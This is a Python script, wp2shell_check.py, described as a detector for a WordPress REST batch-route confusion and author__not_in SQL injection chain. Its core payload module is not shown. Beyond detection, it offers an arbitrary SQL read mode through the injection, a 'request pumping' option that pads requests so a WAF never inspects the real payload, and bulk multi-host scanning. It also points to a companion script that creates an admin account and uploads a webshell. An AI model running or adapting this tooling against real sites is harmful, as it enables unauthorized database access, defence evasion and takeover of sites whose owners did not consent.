"""
wp2shell_check.py — vulnerability detection only
==================================================
CVE-2026-63030 (REST /batch/v1 route confusion) + CVE-2026-60137
(WP_Query::author__not_in SQL injection) in WordPress core 6.9.0-6.9.4 / 7.0.0-7.0.1.

Confirms the *unauthenticated SQL injection*, automatically, with fallback on
three independent axes so a single blocked path never yields a false negative:

  * **method** (`--method auto`): **UNION reflection** (real data, one request) first;
    then a fast **boolean row-count differential**; then the **time-based SLEEP** oracle.
  * **delivery** (`--delivery auto`): a **JSON** POST to the batch route first; if that
    isn't processed (e.g. an edge blocks `/wp-json`), a **`rest_route=/batch/v1`
    multipart form on `POST /`** (the exact operator request shape).
  * **slot** (`--slot auto`): the shifted request is validated against **`/wp/v2/users`**
    first; if that endpoint is disabled for unauth callers, it falls back to the
    universal **`/wp/v2/posts/<id>`** item endpoint.

Reads no data and changes nothing on the target. `--proof` reads two harmless
scalars (@@version, current_user()) as evidence — still read-only.

Use wp2shell_rce.py for exploitation (creates an admin, uploads a webshell, runs commands).

Authorized use only
-------------------
Run this against systems you own or are explicitly authorized to test. Remote
(non-loopback) targets require --authorized.

Usage
-----
    python3 wp2shell_check.py http://target[:port]           # detect (auto method + delivery)
    python3 wp2shell_check.py http://target --method time    # force the SLEEP oracle
    python3 wp2shell_check.py http://target --delivery multipart  # force rest_route form on /
    python3 wp2shell_check.py http://target --proof          # + read @@version as evidence
    python3 wp2shell_check.py http://target --sql "SELECT ..."  # arbitrary UNION read
    python3 wp2shell_check.py -f hosts.txt --authorized --json
    python3 wp2shell_check.py http://127.0.0.1:8093          # local lab (no --authorized needed)

Status values:
  vulnerable        - actively confirmed via the injection (batch confusion, 6.9.0-7.0.1)
  affected_version  - fingerprinted version is in an affected range but the active check did
                      not fire (e.g. 6.8.0-6.8.5 has the SQLi sink but not the 6.9+ confusion
                      delivery; or a WAF/edge blocked the probe). Version-based, not proof.
  not_vulnerable    - active check negative and version outside the affected ranges

Exit codes: 0 = needs attention (vulnerable or affected_version), 1 = not vulnerable, 2 = error.
Follows redirects while preserving the POST body; ignores TLS errors (curl -k).
"""
import argparse
import concurrent.futures
import json
import re
import secrets
import sys
import threading
import urllib.error
from collections import Counter

from wp2shell_core import Target, is_local, __version__

# Full chain = batch-route confusion (CVE-2026-63030) + SQLi. Only these ranges are
# actively testable: the confusion is what bypasses input sanitization to reach the sink.
FULL_CHAIN = [((6, 9, 0), (6, 9, 4)), ((7, 0, 0), (7, 0, 1))]
# SQLi sink alone (CVE-2026-60137). The version is affected, but the confusion delivery
# does NOT exist here, so there is no unauth active check on this branch (fixed 6.8.6).
SINK_ONLY = [((6, 8, 0), (6, 8, 5))]


def _ver_tuple(s):
    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", s)
    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0)) if m else None


def fingerprint_version(t):
    # Cache-bust every read: a CDN (Cloudflare/Akamai) in front of WordPress caches the HTML
    # homepage, so a plain fetch can return a STALE generator meta from before an auto-update —
    # which misfingerprints a patched site as an affected version. A unique query param + no-cache
    # headers force an origin MISS. Core-asset ?ver= (block-library/emoji/wp-embed) is the most
    # reliable signal since it is stamped with the running WP version at build time.
    cb = "wpcb%s" % secrets.token_hex(4)
    nocache = {"Cache-Control": "no-cache", "Pragma": "no-cache"}
    core_asset = (r'(?:block-library/style(?:\.min)?\.css|wp-emoji-release(?:\.min)?\.js'
                  r'|wp-embed(?:\.min)?\.js)\?ver=([0-9]+\.[0-9]+(?:\.[0-9]+)?)')
    for path, pat in (("/", core_asset),
                      ("/", r'content="WordPress\s+([0-9.]+)"'),
                      ("/feed/", r"<generator>\s*https?://wordpress\.org/\?v=([0-9.]+)"),
                      ("/readme.html", r"Version\s+([0-9.]+)")):
        url = t.base + path + ("&" if "?" in path else "?") + cb
        try:
            _, _, body, _ = t._raw(url, headers=nocache)
            m = re.search(pat, body.decode("utf-8", "replace"))
            if m:
                return m.group(1)
        except Exception:
            pass
    return None


def version_verdict(ver):
    vt = _ver_tuple(ver) if ver else None
    if not vt:
        return "unknown"
    if any(lo <= vt <= hi for lo, hi in FULL_CHAIN):
        return "affected-full-chain"
    if any(lo <= vt <= hi for lo, hi in SINK_ONLY):
        return "affected-sqli-sink-only"
    return "outside-affected-range"


def scan_one(url, args):
    t = Target(url, timeout=args.timeout, proxy=args.proxy, sleep=args.sleep,
               route=args.route, delivery=args.delivery, slot=args.slot,
               headers=getattr(args, "parsed_headers", []),
               cookies=args.cookies, bypass=args.bypass)
    rec = {"target": url}
    # automatic method (union -> boolean -> time) + delivery selection (see detect_auto)
    try:
        res = t.detect_auto(method=args.method, rounds=args.rounds)
    except urllib.error.URLError as e:
        rec.update(status="error", error=str(e.reason))
        return rec, 2
    active = res["vulnerable"]
    rec["delivery"] = res.get("delivery")
    rec["slot"] = res.get("slot")
    if active:
        rec["method"] = res["method"]
        if res["method"] == "boolean":
            boo = res["boolean"]
            rec["bool_signal"] = boo["signal"]
            rec["bool_true_rows"] = boo["true_total"] if boo["true_total"] is not None else boo["true_posts"]
            rec["bool_false_rows"] = boo["false_total"] if boo["false_total"] is not None else boo["false_posts"]
    # surface time evidence whenever the SLEEP oracle actually ran (confirm or negative)
    det = res.get("time")
    if isinstance(det, dict) and "fast" in det:
        rec["fast_s"] = round(det["fast"], 3)
        rec["slow_s"] = round(det["slow"], 3)
        rec["delta_s"] = round(det["delta"], 3)
    ver = fingerprint_version(t)
    rec["wp_version"] = ver
    rec["version_verdict"] = version_verdict(ver)
    vv = rec["version_verdict"]
    rec["active_check"] = "fired" if active else "negative"
    if active:
        rec["status"] = "vulnerable"                     # actively confirmed via the injection
        rec["confirmed"] = "unauthenticated SQL injection"
        rec["rce"] = ("reachable on stock config; additionally requires no persistent object "
                      "cache (not verified remotely -- use wp2shell_rce.py, which preflights "
                      "it before writing anything)")
    elif vv in ("affected-full-chain", "affected-sqli-sink-only"):
        rec["status"] = "affected_version"               # version affected; active probe didn't confirm
        if vv == "affected-sqli-sink-only":
            rec["note"] = ("version affected by the author__not_in SQLi (CVE-2026-60137, fixed 6.8.6); "
                           "the batch-route confusion that delivers it unauthenticated is 6.9.0+, so "
                           "there is no unauth active check on the 6.8.x branch")
        else:
            rec["note"] = ("version in the full-chain range but the active injection did not fire "
                           "(a WAF/edge may be blocking the batch payload, or the probe was throttled) "
                           "-- treat as affected and patch")
    else:
        rec["status"] = "not_vulnerable"
    code = 0 if rec["status"] in ("vulnerable", "affected_version") else 1
    if active and args.proof:
        proof_exprs = {"@@version": ("SELECT @@version", 40),
                       "current_user()": ("SELECT CURRENT_USER()", 48)}
        try:
            vals = t._inband_read([expr for expr, _ in proof_exprs.values()])
        except Exception:
            vals = [None] * len(proof_exprs)
        if any(v is None for v in vals) and t._base <= 0 and not t.union:
            try:
                t.detect(rounds=args.rounds)
            except urllib.error.URLError:
                pass
        try:
            rec["proof"] = {
                label: (v if v is not None else t.read_scalar(expr, maxlen))
                for (label, (expr, maxlen)), v in zip(proof_exprs.items(), vals)}
        except Exception as e:
            rec["proof_error"] = str(e)
    return rec, code


def human(rec):
    tag = {"vulnerable": "VULNERABLE", "affected_version": "AFFECTED (version)",
           "not_vulnerable": "not vulnerable", "error": "ERROR"}[rec["status"]]
    line = "[%s] %s" % (tag, rec["target"])
    if rec.get("wp_version"):
        line += "  (WordPress %s, %s)" % (rec["wp_version"], rec["version_verdict"])
    if rec["status"] == "error":
        line += "  -- %s" % rec.get("error")
    else:
        bits = []
        if rec.get("method") == "union":
            bits.append("method=union (data reflected)")
        if rec.get("method") == "boolean":
            bits.append("method=boolean rows(true/false)=%s/%s via %s" % (
                rec.get("bool_true_rows"), rec.get("bool_false_rows"), rec.get("bool_signal")))
        if "delta_s" in rec:
            bits.append("method=time fast=%.2fs slow=%.2fs delta=%.2fs" % (
                rec["fast_s"], rec["slow_s"], rec["delta_s"]))
        if rec.get("delivery"):
            bits.append("delivery=%s" % rec["delivery"])
        if rec.get("slot"):
            bits.append("slot=%s" % rec["slot"])
        if bits:
            line += "  [active=%s | %s]" % (rec.get("active_check", "?"), " | ".join(bits))
    out = [line]
    if rec.get("confirmed"):
        out.append("        confirmed: " + rec["confirmed"])
    if rec.get("rce"):
        out.append("        rce: " + rec["rce"])
    if rec.get("note"):
        out.append("        note: " + rec["note"])
    if rec.get("proof"):
        for k, v in rec["proof"].items():
            out.append("        proof  %-16s = %s" % (k, v))
    return "\n".join(out)


def main():
    p = argparse.ArgumentParser(
        description="wp2shell_check (CVE-2026-63030/60137) vulnerability detector.")
    p.add_argument("url", nargs="?", help="target base URL, e.g. http://host:8093")
    p.add_argument("-f", "--file", help="file with one target URL per line (# comments ok)")
    p.add_argument("--proof", action="store_true",
                   help="read @@version + current_user() as evidence (read-only)")
    p.add_argument("--sql", metavar="QUERY",
                   help="execute a SQL query via the UNION sink and print the result "
                        "(read-only, single request). The query must return a single "
                        "scalar — use GROUP_CONCAT / LIMIT 1 for multi-row.")
    p.add_argument("--route", choices=("auto", "rest-route", "wp-json"), default="auto")
    p.add_argument("--method", choices=("auto", "boolean", "time", "union"), default="auto",
                   help="extraction/oracle method. auto (default) tries UNION reflection first, "
                        "then the fast boolean row-count differential, then the time-based SLEEP "
                        "oracle. boolean/time force a blind oracle; union forces reflection.")
    p.add_argument("--delivery", choices=("auto", "json", "multipart"), default="auto",
                   help="batch delivery. auto (default) uses a JSON POST to the batch route and "
                        "falls back to a rest_route=/batch/v1 multipart form on POST / if the JSON "
                        "batch isn't processed (e.g. an edge blocks /wp-json). json/multipart force one.")
    p.add_argument("--multipart", action="store_true",
                   help="alias for --delivery multipart (the exact operator request shape)")
    p.add_argument("--slot", choices=("auto", "users", "posts-item"), default="auto",
                   help="validation slot the shifted request rides. auto (default) tries the "
                        "proven users endpoint first and falls back to the universal posts-item "
                        "endpoint (/wp/v2/posts/<id>) when users is disabled for unauthenticated "
                        "callers; users/posts-item force one.")
    p.add_argument("--sleep", type=float, default=4.0, help="injected SLEEP seconds (default 4)")
    p.add_argument("--rounds", type=int, default=3, help="median over N probes (default 3)")
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 (Burp)")
    p.add_argument("--cookies", default="",
                   help="cookies string sent on every request via http.client "
                        "(e.g. 'cf_clearance=...; __cf_bm=...; pll_language=en'). "
                        "When set (or with --bypass), requests use http.client "
                        "with junk-padded bodies (request pumping technique).")
    p.add_argument("--bypass", action="store_true",
                   help="Enable request pumping: route all requests "
                        "through http.client and wrap the batch in a ~2MB junk-padded "
                        "JSON body so the WAF never inspects the real requests array. "
                        "No headers are sent automatically — supply UA and any "
                        "fingerprint headers via -H. Combine with --multipart for "
                        "junk-padded multipart bodies, or --cookies for CF clearance.")
    p.add_argument("-H", "--header", action="append", default=[], metavar="'Name: Value'",
                   help="extra header added to every request (repeatable), e.g. "
                        "-H 'Cookie: a=b' -H 'X-Forwarded-For: 127.0.0.1'")
    p.add_argument("-t", "--threads", type=int, default=10,
                   help="concurrent workers for -f scans (default 10)")
    p.add_argument("--authorized", action="store_true",
                   help="assert authorization for remote targets")
    p.add_argument("--json", action="store_true", help="emit JSON")
    args = p.parse_args()
    if args.multipart:
        args.delivery = "multipart"
    # parse -H "Name: Value" pairs once; reused for every Target
    hdrs = []
    for h in args.header:
        if ":" not in h:
            p.error("bad header %r (expected 'Name: Value')" % h)
        name, value = h.split(":", 1)
        hdrs.append((name.strip(), value.strip()))
    args.parsed_headers = hdrs   # consumed by scan_one() for -f targets

    # -- standalone UNION proof mode (--method union, single target, no -f) ----
    if args.method == "union" and not args.file and args.url and not args.sql:
        url = args.url if "://" in args.url else "http://" + args.url
        if not is_local(url) and not args.authorized:
            p.error("--method union on remote targets requires --authorized")
        delivery = "json" if args.delivery == "auto" else args.delivery
        t = Target(url, timeout=args.timeout, proxy=args.proxy,
                   route=args.route, delivery=delivery, slot=args.slot,
                   headers=hdrs, cookies=args.cookies, bypass=args.bypass)
        t.union = True
        reads = {"@@version": "SELECT @@version",
                 "current_user()": "SELECT CURRENT_USER()",
                 "database()": "SELECT DATABASE()"}
        try:
            confirmed = t._union_confirms()
        except urllib.error.URLError as e:
            print("[-] %s" % e.reason); return 2
        if not confirmed:
            print("[-] union reflection failed (not vulnerable or blocked)")
            return 1
        print("[+] vulnerable (UNION reflection confirmed)")
        out = {}
        for label, expr in reads.items():
            try:
                out[label] = t.read_union(expr)
            except Exception as e:
                out[label] = "<error: %s>" % e
        if args.json:
            print(json.dumps({"target": url, "union_proof": out}, indent=2))
        else:
            for k, v in out.items():
                print("    %-16s = %s" % (k, v))
        return 0

    # -- --sql mode: arbitrary UNION read ------------------------------------
    if args.sql:
        if not args.url:
            p.error("--sql requires a target URL")
        url = args.url if "://" in args.url else "http://" + args.url
        if not is_local(url) and not args.authorized:
            p.error("--sql on remote targets requires --authorized")
        delivery = "json" if args.delivery == "auto" else args.delivery
        t = Target(url, timeout=max(args.timeout, 30), proxy=args.proxy,
                   sleep=args.sleep, route=args.route, delivery=delivery, slot=args.slot,
                   headers=hdrs, cookies=args.cookies, bypass=args.bypass)
        t.union = True
        try:
            confirmed = t._union_confirms()
        except urllib.error.URLError as e:
            print("[-] %s" % e.reason); return 2
        if not confirmed:
            print("[-] union reflection failed (not vulnerable or blocked)")
            return 1
        print("[+] vulnerable (UNION reflection confirmed), executing query ...")
        try:
            result = t.read_union(args.sql)
        except Exception as e:
            print("[-] query failed: %s" % e); return 2
        print(result)
        return 0

    # -- detection mode (default) ---------------------------------------------
    targets = []
    if args.file:
        with open(args.file) as fh:
            targets = [ln.strip() for ln in fh
                       if ln.strip() and not ln.strip().startswith("#")]
    if args.url:
        targets.insert(0, args.url)
    if not targets:
        p.error("provide a target URL or -f hosts.txt")

    remote = [u for u in targets if not is_local(u)]
    if remote and not args.authorized:
        sys.stderr.write(
            "refusing remote targets without --authorized.\n"
            "Only test assets you own or are explicitly authorized to test.\n"
            "Affected remote targets: %s\n" % ", ".join(remote))
        return 2

    def prep(u):
        return u if "://" in u else "http://" + u

    def work(idx, u):
        try:
            rec, _ = scan_one(prep(u), args)
        except Exception as e:                       # one bad host must never kill the run
            rec = {"target": prep(u), "status": "error", "error": repr(e)}
        return idx, rec

    total = len(targets)
    workers = max(1, min(args.threads, total))
    results = [None] * total
    lock = threading.Lock()
    done = [0]

    def emit(idx, rec):
        results[idx] = rec
        with lock:
            done[0] += 1
            if args.json:
                sys.stderr.write("\r  scanned %d/%d" % (done[0], total)); sys.stderr.flush()
            else:
                pfx = "[%d/%d] " % (done[0], total) if total > 1 else ""
                print(pfx + human(rec), flush=True)

    if workers == 1:
        for i, u in enumerate(targets):
            emit(*work(i, u))
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(work, i, u) for i, u in enumerate(targets)]
            try:
                for fut in concurrent.futures.as_completed(futs):
                    emit(*fut.result())
            except KeyboardInterrupt:
                sys.stderr.write("\ninterrupted -- cancelling pending scans\n")
                ex.shutdown(wait=False, cancel_futures=True)

    results = [r for r in results if r is not None]
    if args.json:
        sys.stderr.write("\n")
        print(json.dumps(results, indent=2))

    c = Counter(r["status"] for r in results)
    sys.stderr.write("\nsummary: %d scanned | vulnerable=%d  affected_version=%d  "
                     "not_vulnerable=%d  error=%d\n" % (
                         len(results), c.get("vulnerable", 0), c.get("affected_version", 0),
                         c.get("not_vulnerable", 0), c.get("error", 0)))

    # exit 0 if any host needs attention (actively vulnerable or affected version),
    # else 1 (all clear), else 2 (all errored)
    if any(r["status"] in ("vulnerable", "affected_version") for r in results):
        return 0
    if results and all(r["status"] == "error" for r in results):
        return 2
    return 1


if __name__ == "__main__":
    sys.exit(main())
